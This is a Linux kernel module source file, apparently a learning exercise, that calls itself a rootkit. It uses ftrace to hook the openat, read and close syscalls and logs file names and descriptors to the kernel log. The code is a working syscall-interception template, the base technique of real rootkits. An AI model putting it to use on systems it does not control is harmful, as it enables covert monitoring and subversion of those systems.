#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include "hooker.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ostrik");
MODULE_DESCRIPTION("Hook syscalls open, read, close");
MODULE_VERSION("1.0");

static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_read)(const struct pt_regs *);
static asmlinkage long (*orig_close)(const struct pt_regs *);

asmlinkage long hook_openat(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->si;
    char file_name[NAME_MAX] = {0};

    long error = strncpy_from_user(file_name, pathname, NAME_MAX);
    if (error > 0) {
        printk(KERN_INFO "rootkit: opened file: %s\n", file_name);
    }

    return orig_openat(regs);
}

asmlinkage long hook_read(const struct pt_regs *regs)
{
    int fd = regs->di;
    size_t count = regs->dx;
    printk(KERN_INFO "rootkit: read from fd %d, size: %lu\n", fd, count);

    return orig_read(regs);
}


asmlinkage long hook_close(const struct pt_regs *regs)
{
    int fd = regs->di;
    printk(KERN_INFO "rootkit: closed fd %d\n", fd);

    return orig_close(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_openat", hook_openat, &orig_openat),
    // HOOK("sys_read", hook_read, &orig_read),
    HOOK("sys_close", hook_close, &orig_close),
};

static int __init rootkit_init(void)
{
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_ERR "rootkit: failed to install hooks\n");
        return err;
    }

    printk(KERN_INFO "rootkit: hooks installed successfully\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: hooks removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
